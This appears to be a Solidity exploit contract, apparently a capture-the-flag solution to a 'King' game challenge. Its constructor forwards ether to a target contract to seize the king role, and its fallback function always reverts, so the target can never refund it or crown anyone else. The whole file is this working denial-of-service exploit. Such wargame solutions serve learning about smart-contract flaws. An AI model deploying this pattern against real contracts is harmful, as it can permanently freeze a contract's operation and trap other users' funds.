pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address _kingAddress) public payable {
        _kingAddress.call{value: msg.value}("");
    }
    
    fallback() payable external {
        revert("yolo");
    }
}